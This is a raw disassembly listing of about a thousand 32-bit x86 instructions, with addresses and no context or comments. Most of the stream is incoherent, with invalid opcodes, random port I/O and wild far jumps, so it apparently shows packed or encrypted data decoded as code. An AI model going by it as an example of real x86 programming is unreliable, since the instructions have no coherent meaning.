  41fa62:	push   eax
  41fa63:	sub    BYTE PTR [esi+0x20505267],dh
  41fa69:	test   eax,0x855c2d10
  41fa6e:	jnp    0x41fab9
  41fa70:	ror    DWORD PTR [edi+0x6],0xb9
  41fa74:	mov    ch,0x7a
  41fa76:	lock test BYTE PTR [ebp-0x6a569847],bh
  41fa7d:	dec    edx
  41fa7e:	rol    DWORD PTR [ebx+0x9],cl
  41fa81:	mov    ecx,0xba2c2e90
  41fa86:	ret    0x1fcb
  41fa89:	sub    al,0xbf
  41fa8b:	aas    
  41fa8c:	adc    edi,DWORD PTR ds:0x411e37e0
  41fa92:	rcr    ebx,cl
  41fa94:	mov    DWORD PTR [eax+0x48],eax
  41fa97:	mov    ebx,0xd4f928fb
  41fa9c:	loop   0x41fac5
  41fa9e:	xchg   al,al
  41faa0:	mov    al,0xf2
  41faa2:	in     eax,0x8e
  41faa4:	in     al,dx
  41faa5:	mov    ch,0xd1
  41faa7:	(bad)  
  41faa8:	aas    
  41faa9:	add    dl,BYTE PTR [ecx]
  41faab:	or     al,0x53
  41faad:	sub    esp,DWORD PTR [ecx+edi*2-0x7f4ce597]
  41fab4:	in     eax,0xc
  41fab6:	mov    ch,0xb1
  41fab8:	dec    edx
  41fab9:	and    eax,0x275e4f8
  41fabe:	xchg   esi,eax
  41fabf:	cmp    edi,DWORD PTR [edi+0x49]
  41fac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fac3:	adc    ebp,esi
  41fac5:	jmp    0x41facb
  41fac7:	push   edx
  41fac8:	ins    DWORD PTR es:[edi],dx
  41fac9:	xor    al,0xa9
  41facb:	fsubrp st(5),st
  41facd:	xchg   esp,eax
  41face:	push   ecx
  41facf:	bound  edi,QWORD PTR [eax+0x6a5c9b56]
  41fad5:	pusha  
  41fad6:	xchg   DWORD PTR [esi+ecx*4],ebx
  41fad9:	jge    0x41fb14
  41fadb:	mov    esp,0x7f25146d
  41fae0:	mov    BYTE PTR ds:0x794a2b57,ah
  41fae6:	aas    
  41fae7:	push   ebx
  41fae8:	push   esp
  41fae9:	add    al,0x8a
  41faeb:	cmc    
  41faec:	pop    edx
  41faed:	aas    
  41faee:	test   al,0x3d
  41faf0:	lods   al,BYTE PTR ds:[esi]
  41faf1:	push   ebx
  41faf2:	pushf  
  41faf3:	(bad)  
  41faf5:	shl    BYTE PTR [ecx+0x1a],1
  41faf8:	xor    DWORD PTR [eax+0x64],ecx
  41fafb:	in     al,dx
  41fafc:	iret   
  41fafd:	aad    0xb1
  41faff:	mov    esi,0xb3d9ffeb
  41fb04:	xor    BYTE PTR [ebx+edx*4-0x5a2c9e31],0xec
  41fb0c:	(bad)  
  41fb0e:	xor    eax,0x5c303a64
  41fb13:	jno    0x41fb01
  41fb15:	sub    DWORD PTR [ebx-0x36],0x390664e
  41fb1c:	mov    ah,0xaa
  41fb1e:	icebp  
  41fb1f:	outs   dx,BYTE PTR ds:[esi]
  41fb20:	loope  0x41fb83
  41fb22:	dec    ebx
  41fb23:	pop    ds
  41fb24:	mov    cl,0x95
  41fb26:	mov    dl,0x17
  41fb28:	iret   
  41fb29:	mov    ecx,0x514ba773
  41fb2e:	add    bh,BYTE PTR [edi+edx*4]
  41fb31:	jb     0x41fb67
  41fb33:	ja     0x41fb5f
  41fb35:	adc    BYTE PTR [ebx+esi*1-0x2],ah
  41fb39:	push   ds
  41fb3a:	and    al,0xcf
  41fb3c:	pop    esp
  41fb3d:	jmp    0x20bced6
  41fb42:	xlat   BYTE PTR ds:[ebx]
  41fb43:	push   ds
  41fb44:	gs pop edx
  41fb46:	jmp    0xccb1:0x360f1fa3
  41fb4d:	pusha  
  41fb4e:	xchg   BYTE PTR [edx-0x55],bl
  41fb51:	fwait
  41fb52:	push   es
  41fb53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb54:	sub    eax,0xfaf41a46
  41fb59:	inc    ebx
  41fb5a:	xlat   BYTE PTR ds:[ebx]
  41fb5b:	lea    esp,[esi+0x57]
  41fb5e:	fldenv [ecx]
  41fb60:	es addr16 in al,0xc6
  41fb64:	sub    dl,BYTE PTR [edi]
  41fb66:	sub    eax,0x9fc6fea4
  41fb6b:	adc    DWORD PTR [ebx],esp
  41fb6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb6e:	ds push cx
  41fb71:	or     al,0xda
  41fb73:	dec    ecx
  41fb74:	lahf   
  41fb75:	loopne 0x41fafb
  41fb77:	xor    edi,DWORD PTR cs:[ebp-0x6addbde6]
  41fb7e:	sar    edi,0xca
  41fb81:	pop    esi
  41fb82:	js     0x41fbd6
  41fb84:	and    DWORD PTR [ecx+edx*1],esp
  41fb87:	mov    dl,0xd2
  41fb89:	(bad)  
  41fb8a:	stc    
  41fb8b:	xorps  xmm7,XMMWORD PTR [esi-0x4c]
  41fb8f:	inc    eax
  41fb90:	inc    ecx
  41fb91:	fst    DWORD PTR [esi-0x62321501]
  41fb97:	inc    esp
  41fb98:	pop    ss
  41fb99:	mov    esp,0x41e19112
  41fb9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb9f:	dec    edi
  41fba0:	add    al,BYTE PTR [esi-0x18c709da]
  41fba6:	ret    
  41fba7:	fst    QWORD PTR [esi+0x1b]
  41fbaa:	repnz scas eax,DWORD PTR es:[edi]
  41fbac:	dec    ebx
  41fbad:	in     al,0x75
  41fbaf:	jns    0x41fbd5
  41fbb1:	adc    esi,esp
  41fbb3:	test   al,0xe9
  41fbb5:	push   cs
  41fbb6:	fwait
  41fbb7:	mov    ds:0x387e57e5,eax
  41fbbc:	out    dx,eax
  41fbbd:	push   edi
  41fbbe:	cmp    dl,BYTE PTR [esi]
  41fbc0:	test   eax,0x38c3ef5d
  41fbc5:	pushf  
  41fbc6:	mov    al,BYTE PTR [edi-0x64]
  41fbc9:	ss xchg esi,eax
  41fbcb:	loopne 0x41fc3c
  41fbcd:	daa    
  41fbce:	js     0x41fc4f
  41fbd0:	addr16 pop esp
  41fbd2:	pushf  
  41fbd3:	mov    ebp,0xa7d231d4
  41fbd8:	aam    0x9b
  41fbda:	mov    dl,0xff
  41fbdc:	add    ch,dl
  41fbde:	jl     0x41fb7c
  41fbe0:	xor    BYTE PTR [ebx],dh
  41fbe2:	mov    DWORD PTR [edx-0x18],0xb5a2707b
  41fbe9:	sbb    dl,dh
  41fbeb:	push   0x9cbcae1b
  41fbf0:	mov    bl,0x2
  41fbf2:	sub    eax,0x2c1e7ff0
  41fbf7:	sub    BYTE PTR [edi+ecx*8-0x40b63878],dh
  41fbfe:	test   eax,0x9781e143
  41fc03:	ins    BYTE PTR es:[edi],dx
  41fc04:	out    0xc9,eax
  41fc06:	popf   
  41fc07:	lds    eax,FWORD PTR [edx]
  41fc09:	int3   
  41fc0a:	or     ch,BYTE PTR [edi]
  41fc0c:	and    eax,DWORD PTR [esi+0x2e]
  41fc0f:	ds pop ds
  41fc11:	adc    eax,DWORD PTR [ebx-0x2919ab45]
  41fc17:	popa   
  41fc18:	mov    bl,0x31
  41fc1a:	mov    ah,BYTE PTR [esp+eiz*4-0x7a]
  41fc1e:	push   edx
  41fc1f:	(bad)
  41fc22:	retf   
  41fc23:	out    0x7c,al
  41fc25:	jp     0x41fc94
  41fc27:	jle    0x41fbf0
  41fc29:	pop    esp
  41fc2a:	add    al,0x33
  41fc2c:	outs   dx,DWORD PTR ds:[esi]
  41fc2d:	mov    esp,DWORD PTR [edi]
  41fc2f:	cmp    edi,eax
  41fc31:	test   al,0xda
  41fc33:	mov    ecx,0x56404ed6
  41fc38:	and    al,0x18
  41fc3a:	sub    al,0x69
  41fc3c:	push   ecx
  41fc3d:	scas   eax,DWORD PTR es:[edi]
  41fc3e:	iret   
  41fc3f:	cld    
  41fc40:	fnsave [edx-0x315218c2]
  41fc46:	push   edx
  41fc47:	xchg   esi,eax
  41fc48:	mov    ebp,DWORD PTR [esi-0x3ba7656c]
  41fc4e:	dec    esi
  41fc4f:	(bad)  [ecx]
  41fc51:	daa    
  41fc52:	xor    DWORD PTR [ecx],ebp
  41fc54:	jg     0x41fc4c
  41fc56:	and    eax,0x2b12d88
  41fc5b:	cmp    bh,BYTE PTR [esp+eiz*4-0x17]
  41fc5f:	and    eax,0x31755726
  41fc64:	push   cs
  41fc65:	cmp    eax,0x7ade06c9
  41fc6a:	mov    eax,ds:0xf1bf61a8
  41fc6f:	adc    BYTE PTR [edi+0x60a3a9c3],dh
  41fc75:	jnp    0x41fc6c
  41fc77:	sbb    esp,DWORD PTR [esi+0x749de72b]
  41fc7d:	fst    DWORD PTR [esi+ebx*1+0x48]
  41fc81:	outs   dx,BYTE PTR ds:[esi]
  41fc82:	imul   edi,DWORD PTR ds:0xb11d0c09,0xa60f9f10
  41fc8c:	retf   0x986a
  41fc8f:	cmp    al,0x1
  41fc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc92:	outs   dx,BYTE PTR ds:[esi]
  41fc93:	in     eax,dx
  41fc94:	mov    eax,0x6fbedc1
  41fc99:	pop    es
	...
  41fd12:	add    BYTE PTR [eax],al
  41fd14:	xchg   edi,edx
  41fd16:	dec    ebp
  41fd17:	jnp    0x41fd76
  41fd19:	sti    
  41fd1a:	mov    bh,0xff
  41fd1c:	ds aad 0x54
  41fd1f:	ret    0xb6d9
  41fd22:	stos   DWORD PTR es:[edi],eax
  41fd23:	stos   DWORD PTR es:[edi],eax
  41fd24:	rcl    DWORD PTR [esi+0x76e0001],cl
  41fd2a:	add    BYTE PTR [eax],al
  41fd2c:	fdivr  DWORD PTR [edx-0x239df368]
  41fd32:	pop    ds
  41fd33:	or     cl,ah
  41fd35:	jo     0x41fd7e
  41fd37:	jg     0x41fd56
  41fd39:	xchg   ebx,eax
  41fd3a:	es leave 
  41fd3c:	iret   
  41fd3d:	aaa    
  41fd3e:	and    DWORD PTR [esi-0x8],ebx
  41fd41:	push   ebp
  41fd42:	mov    WORD PTR [ecx+0x5],?
  41fd45:	fwait
  41fd46:	xor    DWORD PTR [ebp-0x1c8bc998],0xc3db6802
  41fd50:	(bad)  
  41fd51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd52:	inc    edi
  41fd53:	dec    esi
  41fd54:	lods   al,BYTE PTR ds:[esi]
  41fd55:	mov    WORD PTR [edx],cs
  41fd57:	ret    
  41fd58:	mov    bl,bh
  41fd5a:	mov    cl,0x0
  41fd5c:	das    
  41fd5d:	out    dx,eax
  41fd5e:	xlat   BYTE PTR ds:[ebx]
  41fd5f:	sti    
  41fd60:	dec    eax
  41fd61:	jno    0x41fdb2
  41fd63:	mov    eax,0xb4e51f7a
  41fd68:	imul   esp,DWORD PTR [ebx+0x4ca7c27e],0xcdacbe45
  41fd72:	enter  0xce9a,0x2c
  41fd76:	cdq    
  41fd77:	xchg   edi,eax
  41fd78:	hlt    
  41fd79:	js     0x41fdc1
  41fd7b:	mov    ecx,0x66469779
  41fd80:	retf   
  41fd81:	pop    edi
  41fd82:	pop    edi
  41fd83:	xchg   edi,eax
  41fd84:	js     0x41fd6b
  41fd86:	xchg   DWORD PTR [esi-0x3a312efe],ebp
  41fd8c:	jo     0x41fd4c
  41fd8e:	enter  0x3e56,0x6b
  41fd92:	mov    dl,0x82
  41fd94:	mov    al,0xf8
  41fd96:	xor    eax,0xadc3f722
  41fd9b:	aas    
  41fd9c:	fdivr  st(2),st
  41fd9e:	adc    ebx,eax
  41fda0:	es jns 0x41fd86
  41fda3:	mov    dh,0x99
  41fda5:	push   0x8ca2304e
  41fdaa:	mov    al,0x2e
  41fdac:	fldenv [edi]
  41fdae:	mov    eax,0x2e4a2488
  41fdb3:	inc    esi
  41fdb4:	mov    cl,0xbd
  41fdb6:	push   es
  41fdb7:	pusha  
  41fdb8:	sub    esi,DWORD PTR [edx-0x29499cb9]
  41fdbe:	xchg   esp,eax
  41fdbf:	dec    ebx
  41fdc0:	mov    ah,0xe2
  41fdc2:	rcl    DWORD PTR [eax-0x38],cl
  41fdc5:	(bad)  
  41fdc6:	in     eax,0xed
  41fdc8:	dec    ebx
  41fdc9:	arpl   WORD PTR [ecx],bx
  41fdcb:	loop   0x41fd5d
  41fdcd:	inc    eax
  41fdce:	fisubr WORD PTR [eax+0x2a0cfbc2]
  41fdd4:	popa   
  41fdd5:	retf   
  41fdd6:	cwde   
  41fdd7:	rcl    BYTE PTR [eax],1
  41fdd9:	pushf  
  41fdda:	pop    edx
  41fddb:	les    ecx,FWORD PTR [ebx]
  41fddd:	inc    esi
  41fdde:	js     0x41fd8c
  41fde0:	mov    al,0x33
  41fde2:	and    ah,ch
  41fde4:	loopne 0x41fe0c
  41fde6:	sbb    BYTE PTR [edi],cl
  41fde8:	enter  0x6e13,0x70
  41fdec:	cmc    
  41fded:	push   ecx
  41fdee:	jo     0x41fe6d
  41fdf0:	jb     0x7834f6d0
  41fdf6:	mov    ds:0x95629c4d,eax
  41fdfb:	rol    bl,1
  41fdfd:	and    al,0x32
  41fdff:	push   ebx
  41fe00:	cld    
  41fe01:	das    
  41fe02:	push   cs
  41fe03:	aaa    
  41fe04:	xor    ebp,DWORD PTR [eax-0x51]
  41fe07:	dec    eax
  41fe08:	and    al,0x89
  41fe0a:	out    0xe6,al
  41fe0c:	ins    BYTE PTR es:[edi],dx
  41fe0d:	loop   0x41fdeb
  41fe0f:	data16 jb 0x41fdc3
  41fe12:	mov    esp,0x8c837971
  41fe17:	add    DWORD PTR [edx],ebx
  41fe19:	sbb    eax,0xb123d41e
  41fe1e:	out    0x5a,eax
  41fe20:	fld    TBYTE PTR [edi-0x122d62bb]
  41fe26:	jg     0x41fe30
  41fe28:	push   edx
  41fe29:	mov    eax,ds:0x576226ed
  41fe2e:	std    
  41fe2f:	aad    0x3d
  41fe31:	jno    0x41fdea
  41fe33:	jmp    FWORD PTR [ecx+0x47ae551c]
  41fe39:	in     al,dx
  41fe3a:	icebp  
  41fe3b:	int    0xd7
  41fe3d:	push   es
  41fe3e:	and    ch,ch
  41fe40:	jo     0x41fe87
  41fe42:	dec    ebx
  41fe43:	popa   
  41fe44:	pushf  
  41fe45:	dec    edi
  41fe46:	nop
  41fe47:	mov    bl,0xc0
  41fe49:	pop    ebp
  41fe4a:	stos   BYTE PTR es:[edi],al
  41fe4b:	push   edx
  41fe4c:	es xor eax,0xd03d43cf
  41fe52:	mov    esi,0xa21f7a8
  41fe57:	(bad)  
  41fe58:	test   esi,0xe72af67d
  41fe5e:	scas   al,BYTE PTR es:[edi]
  41fe5f:	xchg   esp,eax
  41fe60:	cmp    edi,DWORD PTR [esp+ecx*4-0x7eed4ede]
  41fe67:	sub    al,0xd9
  41fe69:	popa   
  41fe6a:	pop    eax
  41fe6b:	in     eax,dx
  41fe6c:	mov    bh,0x53
  41fe6e:	sub    DWORD PTR [ebx+0x28],edi
  41fe71:	xchg   ecx,eax
  41fe72:	xor    bl,BYTE PTR [eax+0x4a]
  41fe75:	jmp    FWORD PTR [esi+0x7b633285]
  41fe7b:	or     BYTE PTR [edi-0xc],bl
  41fe7e:	mov    ecx,0x433216e3
  41fe83:	or     DWORD PTR [edx-0x27],edx
  41fe86:	jmp    0xff179acb
  41fe8b:	aad    0x69
  41fe8d:	loope  0x41fe55
  41fe8f:	repnz popa 
  41fe91:	out    0x59,al
  41fe93:	push   esp
  41fe94:	js     0x41fe5c
  41fe96:	xor    bl,0x22
  41fe99:	ror    bl,1
  41fe9b:	adc    cl,BYTE PTR [edx+0x6e]
  41fe9e:	mov    DWORD PTR [edi],ebx
  41fea0:	bound  esi,QWORD PTR [edi-0x22]
  41fea3:	push   ebx
  41fea4:	ror    esp,1
  41fea6:	lock mov DWORD PTR [ebp+ebp*8-0x64],0x3ce2196b
  41feaf:	or     BYTE PTR [bx+si],0xfe
  41feb3:	push   ss
  41feb4:	xor    BYTE PTR [bx+0x73],0xbc
  41feb9:	cdq    
  41feba:	jnp    0x41ff0f
  41febc:	add    ch,BYTE PTR [ebp-0x18048e0e]
  41fec2:	mov    ds:0xa2515db9,al
  41fec7:	or     BYTE PTR [ebp-0x35c7641],al
  41fecd:	icebp  
  41fece:	out    0x35,eax
  41fed0:	adc    cl,BYTE PTR [ecx]
  41fed2:	inc    ecx
  41fed3:	mov    al,ds:0x3091aa7
  41fed8:	xchg   ecx,eax
  41fed9:	fsub   st,st(3)
  41fedb:	lahf   
  41fedc:	adc    esp,eax
  41fede:	xor    eax,0x45352447
  41fee3:	push   esi
  41fee4:	shr    DWORD PTR [ebp+0x6e04515],1
  41feea:	aad    0x29
  41feec:	in     al,dx
  41feed:	push   es
  41feee:	cmc    
  41feef:	pop    edi
  41fef0:	scas   al,BYTE PTR es:[edi]
  41fef1:	std    
  41fef2:	lahf   
  41fef3:	xchg   DWORD PTR [ecx],ebx
  41fef5:	dec    edi
  41fef6:	enter  0x4260,0x81
  41fefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fefb:	push   0xffffffad
  41fefd:	cmc    
  41fefe:	(bad)  
  41feff:	(bad)  
  41ff00:	in     al,dx
  41ff01:	mov    eax,ds:0xc943287
  41ff06:	dec    ecx
  41ff07:	jmp    0x41ff34
  41ff09:	mov    ds:0x470548e7,al
  41ff0e:	popf   
  41ff0f:	add    al,0x44
  41ff11:	mov    cs,WORD PTR cs:[eax+0x792e440]
  41ff18:	daa    
  41ff19:	inc    ebp
  41ff1a:	dec    esp
  41ff1b:	retf   
  41ff1c:	rcr    eax,1
  41ff1e:	jb     0x41ff1d
  41ff20:	cmp    DWORD PTR [ecx-0x9e50cee],eax
  41ff26:	out    0x0,eax
  41ff28:	and    al,0x73
  41ff2a:	adc    al,BYTE PTR [eax-0x618acf42]
  41ff30:	xchg   ebp,eax
  41ff31:	mov    edi,0x4cfe98ac
  41ff36:	adc    ebx,DWORD PTR [ecx+0x8]
  41ff39:	lea    edx,[ecx]
  41ff3b:	retf   0xecd4
  41ff3e:	popa   
  41ff3f:	fimul  WORD PTR [edi+0x6b6b2151]
  41ff45:	sub    al,0xcb
  41ff47:	pop    ebp
  41ff48:	mov    ds:0xac815246,al
  41ff4d:	xor    BYTE PTR [esi],dh
  41ff4f:	push   esp
  41ff50:	mov    WORD PTR [ebx],gs
  41ff52:	mov    bl,0x1e
  41ff54:	xor    eax,0x85ce14a5
  41ff59:	dec    eax
  41ff5a:	ret    
  41ff5b:	mov    ds:0x98774024,al
  41ff60:	add    ebx,DWORD PTR [edx+0x4e]
  41ff63:	aad    0xa1
  41ff65:	rcl    DWORD PTR [ebx+0x44],0x7f
  41ff69:	lahf   
  41ff6a:	nop
  41ff6b:	push   es
  41ff6c:	cmp    ebx,edi
  41ff6e:	std    
  41ff6f:	jns    0x41ffd8
  41ff71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff72:	jecxz  0x41ff7d
  41ff74:	fimul  WORD PTR [ebx]
  41ff76:	loope  0x41ff21
  41ff78:	pop    DWORD PTR [edx-0x11]
  41ff7b:	clc    
  41ff7c:	popf   
  41ff7d:	scas   al,BYTE PTR es:[edi]
  41ff7e:	mov    ebp,0x6a814dbf
  41ff83:	std    
  41ff84:	mov    bl,0xfe
  41ff86:	fs add eax,0x9e193960
  41ff8c:	repnz inc edx
  41ff8e:	inc    esi
  41ff8f:	cli    
  41ff90:	xor    al,0x3c
  41ff92:	xchg   DWORD PTR [ebp+0x48],edi
  41ff95:	and    cl,BYTE PTR [eax]
  41ff97:	jo     0x41ff99
  41ff99:	loope  0x41ffac
  41ff9b:	in     al,dx
  41ff9c:	shl    BYTE PTR [ebp+0x68],0x5f
  41ffa0:	xchg   esp,eax
  41ffa1:	jle    0x41ff2b
  41ffa3:	jns    0x41ffcb
  41ffa5:	es test bh,ah
  41ffa8:	sbb    BYTE PTR [edi],cl
  41ffaa:	sbb    DWORD PTR [ebx],esi
  41ffac:	sbb    ax,0x9a92
  41ffb0:	ss je  0x41ff47
  41ffb3:	xchg   esi,eax
  41ffb4:	xchg   edi,eax
  41ffb5:	mov    ebx,0x25dbb15a
  41ffba:	sbb    ch,0xd8
  41ffbd:	jge    0x41ff66
  41ffbf:	int    0x6
  41ffc1:	adc    BYTE PTR [esi+0x38],ah
  41ffc4:	mov    bh,0xee
  41ffc6:	xor    DWORD PTR [esi+ecx*1-0x26],edi
  41ffca:	add    BYTE PTR [edx],0x4a
  41ffcd:	loope  0x41ffbe
  41ffcf:	xchg   BYTE PTR [ecx-0x32e64390],ah
  41ffd5:	xchg   esp,eax
  41ffd6:	jmp    0x78f:0x16204a0e
  41ffdd:	push   ss
  41ffde:	mov    dh,0x65
  41ffe0:	xchg   BYTE PTR [ebp-0x2f],cl
  41ffe3:	into   
  41ffe4:	push   edi
  41ffe5:	pop    ecx
  41ffe6:	lds    esi,FWORD PTR [esi+0x746af496]
  41ffec:	jnp    0x42005d
  41ffee:	or     esi,DWORD PTR [eax+0x450c1126]
  41fff4:	shl    ch,0x51
  41fff7:	out    0x5b,al
  41fff9:	adc    BYTE PTR [edi+0x5572448e],0x7b
  420000:	ins    DWORD PTR es:[edi],dx
  420001:	mov    bh,0xee
  420003:	xchg   ebx,eax
  420004:	int3   
  420005:	mov    esi,0xb714c475
  42000a:	xchg   ecx,eax
  42000b:	into   
  42000c:	(bad)  
  42000d:	pop    edx
  42000e:	push   ss
  42000f:	inc    ebp
  420010:	test   al,0x63
  420012:	mov    ds:0xdf591761,eax
  420017:	sar    DWORD PTR [edx-0x3995e7fb],1
  42001d:	mov    al,ds:0x410ca39d
  420022:	mov    esp,0x4e7f9150
  420027:	lds    edx,FWORD PTR [edx-0x4d]
  42002a:	mov    DWORD PTR [edx+0x73],esp
  42002d:	cmp    DWORD PTR [ecx-0x786297fa],edi
  420033:	push   eax
  420034:	mov    dh,0xa4
  420036:	mov    al,ds:0xda7aa53b
  42003b:	mov    al,ds:0x68baa27f
  420040:	cmp    DWORD PTR [eax+0x2],esp
  420043:	sbb    ecx,esi
  420045:	loop   0x420042
  420047:	and    edx,ebp
  420049:	and    BYTE PTR [eax-0xb],al
  42004c:	in     al,0x4
  42004e:	jp     0x41ffe1
  420050:	push   edx
  420051:	ins    DWORD PTR es:[edi],dx
  420052:	mov    DWORD PTR [edx-0x64],esp
  420055:	shl    DWORD PTR [ecx-0x16611ec6],1
  42005b:	push   cs
  42005c:	mov    BYTE PTR [ebp+0x582a7e03],cl
  420062:	test   BYTE PTR [esi-0x5d150c4f],ah
  420068:	pop    edx
  420069:	lods   al,BYTE PTR ds:[esi]
  42006a:	mov    esi,0xe4d869b1
  42006f:	xor    ch,BYTE PTR [edi-0x3b]
  420072:	push   ss
  420073:	mov    bl,0xdf
  420075:	popf   
  420076:	ror    BYTE PTR [eax],cl
  420078:	shr    al,1
  42007a:	(bad)  
  42007b:	dec    ebp
  42007c:	push   ds
  42007d:	lahf   
  42007e:	sub    eax,0x5a828bf7
  420083:	pop    ebp
  420084:	adc    al,0x6f
  420086:	ins    DWORD PTR es:[edi],dx
  420087:	scas   eax,DWORD PTR es:[edi]
  420088:	aaa    
  420089:	ror    DWORD PTR [ebx+0x1dba49ce],0xbb
  420090:	out    0xb9,al
  420092:	xchg   ecx,eax
  420093:	call   0xb897:0x3cbac2bd
  42009a:	aad    0xc1
  42009c:	xlat   BYTE PTR ds:[ebx]
  42009d:	mov    al,ds:0x186e1c11
  4200a2:	fwait
  4200a3:	mov    es,WORD PTR [eax-0x6601508f]
  4200a9:	xor    eax,0x9bd02851
  4200ae:	outs   dx,BYTE PTR ds:[esi]
  4200af:	mov    al,0x9a
  4200b1:	rcr    BYTE PTR [eax],0x24
  4200b4:	xor    al,0x22
  4200b6:	fisub  DWORD PTR [edi-0x1d]
  4200b9:	addr16 je 0x4200a1
  4200bc:	mov    eax,0xe90d5e10
  4200c1:	mov    al,bh
  4200c3:	pop    edi
  4200c4:	mov    BYTE PTR [esi],cl
  4200c6:	lods   eax,DWORD PTR ds:[esi]
  4200c7:	and    BYTE PTR [ebx+0x34325d2],al
  4200cd:	push   0xfffffffb
  4200cf:	cmp    eax,0xe1e09fe9
  4200d4:	inc    ecx
  4200d5:	jno    0x4200fa
  4200d7:	xchg   edi,ebx
  4200d9:	jle    0x4200f8
  4200db:	jmp    0xbad78184
  4200e0:	xchg   ecx,eax
  4200e1:	nop
  4200e2:	add    eax,0x30b52319
  4200e7:	lods   al,BYTE PTR ds:[esi]
  4200e8:	cmc    
  4200e9:	les    eax,FWORD PTR [ebp-0x60814c5]
  4200ef:	xchg   BYTE PTR [ecx-0x66be68be],al
  4200f5:	xchg   esp,eax
  4200f6:	mov    ds:0x7a8ef937,eax
  4200fb:	out    dx,eax
  4200fc:	adc    DWORD PTR [ecx-0x7b],esi
  4200ff:	lea    ebp,[ecx-0x79926d63]
  420105:	aam    0xca
  420107:	mov    edi,es
  420109:	mov    cs,WORD PTR [esp+esi*1]
  42010c:	enter  0xfeb,0xa5
  420110:	(bad)  
  420111:	fst    st(5)
  420113:	pop    ss
  420114:	sbb    al,0xdf
  420116:	shl    edx,1
  420118:	adc    eax,0xb8fececa
  42011d:	bound  esi,QWORD PTR [ebx]
  42011f:	mov    bh,0x71
  420121:	dec    ebx
  420122:	outs   dx,DWORD PTR ds:[esi]
  420123:	mov    dl,0xa1
  420125:	scas   al,BYTE PTR es:[edi]
  420126:	je     0x4200f0
  420128:	jecxz  0x4200f8
  42012a:	xor    ah,al
  42012c:	jno    0x4200b7
  42012e:	cmp    esi,ecx
  420130:	add    cl,ch
  420132:	dec    edx
  420133:	jl     0x420180
  420135:	and    dl,ch
  420137:	mov    ds:0xaabff9f6,al
  42013c:	dec    edx
  42013d:	out    0xa,al
  42013f:	lds    ebp,FWORD PTR [edx+0x5dbe974c]
  420145:	pushf  
  420146:	fmul   DWORD PTR [eax+0x3d6b5885]
  42014c:	push   ebp
  42014d:	sbb    DWORD PTR [eax-0x9ab6fba],esp
  420153:	sub    ch,ah
  420155:	leave  
  420156:	xchg   esp,eax
  420157:	(bad)  
  420158:	sbb    BYTE PTR [esi+0x7b3fd609],al
  42015e:	mov    eax,ds:0xa11fe88b
  420163:	inc    edx
  420164:	jmp    0x9abba895
  420169:	in     eax,dx
  42016a:	repnz sar BYTE PTR [ebx-0x52],1
  42016e:	mov    bl,0xa7
  420170:	imul   esp,DWORD PTR [eax-0xf],0xe1269fd4
  420177:	out    0x4a,eax
  420179:	mov    al,0x4d
  42017b:	clc    
  42017c:	jns    0x4201df
  42017e:	sub    BYTE PTR [edi+ebx*8-0x33d52e5b],0xe9
  420186:	sub    al,0x40
  420188:	sbb    BYTE PTR gs:[esi+0x6c],bh
  42018c:	cmp    eax,0xadbb967
  420191:	and    BYTE PTR ds:0xd7fb14ef,cl
  420197:	pop    ebx
  420198:	pop    esp
  420199:	(bad)  
  42019a:	je     0x42015a
  42019c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42019d:	jbe    0x42012e
  42019f:	jmp    0xbf2ff7f6
  4201a4:	push   edi
  4201a5:	push   es
  4201a6:	or     DWORD PTR [edi+0x5b],eax
  4201a9:	xchg   ecx,eax
  4201aa:	jge    0x420188
  4201ac:	mov    ecx,0xfc44a689
  4201b1:	mov    edi,0x3354c67b
  4201b6:	(bad)  
  4201b7:	and    DWORD PTR [eax],ecx
  4201b9:	dec    ecx
  4201ba:	inc    esi
  4201bb:	or     dh,BYTE PTR [esi+0x62]
  4201be:	rol    ecx,1
  4201c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201c1:	mov    al,0x61
  4201c3:	rcl    BYTE PTR [edx+0x504d661b],cl
  4201c9:	ds loope 0x420238
  4201cc:	jno    0x42019d
  4201ce:	retf   
  4201cf:	or     al,0x6d
  4201d1:	jne    0x42023c
  4201d3:	mov    ds:0x2016aab7,eax
  4201d8:	mov    esi,0x8ee7438d
  4201dd:	or     ah,0x3c
  4201e0:	(bad)  
  4201e2:	jne    0x4201b1
  4201e4:	retf   0xc3a0
  4201e7:	jns    0x420242
  4201e9:	cmp    eax,0x5dfd6163
  4201ee:	pop    edi
  4201ef:	es dec ebp
  4201f1:	mov    edi,0xdb865247
  4201f6:	ins    BYTE PTR es:[edi],dx
  4201f7:	dec    edi
  4201f8:	sub    eax,0x6b2f859a
  4201fd:	sub    dl,BYTE PTR [eax]
  4201ff:	test   BYTE PTR [ebp-0x71],bl
  420202:	aas    
  420203:	add    BYTE PTR [edx+edx*2+0x55655370],bh
  42020a:	xor    edx,DWORD PTR [eax-0x6e]
  42020d:	scas   eax,DWORD PTR es:[edi]
  42020e:	push   esp
  42020f:	(bad)  
  420210:	and    al,0x2e
  420212:	push   eax
  420213:	pop    ss
  420214:	test   BYTE PTR [esp+ebx*1+0x551e2360],dl
  42021b:	push   0x57
  42021d:	xchg   esp,eax
  42021e:	call   0x7abf797
  420223:	add    ecx,DWORD PTR [edi]
  420225:	jmp    0x461f:0xae2186b9
  42022c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42022d:	in     al,0xcd
  42022f:	ins    BYTE PTR es:[edi],dx
  420230:	sbb    edi,DWORD PTR [edi+0x5e]
  420233:	add    bl,BYTE PTR [edi+0x505b65c1]
  420239:	cmp    DWORD PTR [ecx+edx*8],ebp
  42023c:	push   ebx
  42023d:	mov    cl,0x96
  42023f:	loope  0x4202b4
  420241:	sahf   
  420242:	xor    al,0x1a
  420244:	xchg   ebx,eax
  420245:	rcr    BYTE PTR [eax],1
  420247:	stc    
  420248:	fistp  DWORD PTR [ecx+eax*2-0x1a]
  42024c:	and    BYTE PTR [ebp+ebx*8+0x428ad5ed],dh
  420253:	xor    DWORD PTR [ecx-0x4c],edx
  420256:	sub    esp,ebp
  420258:	jl     0x42029c
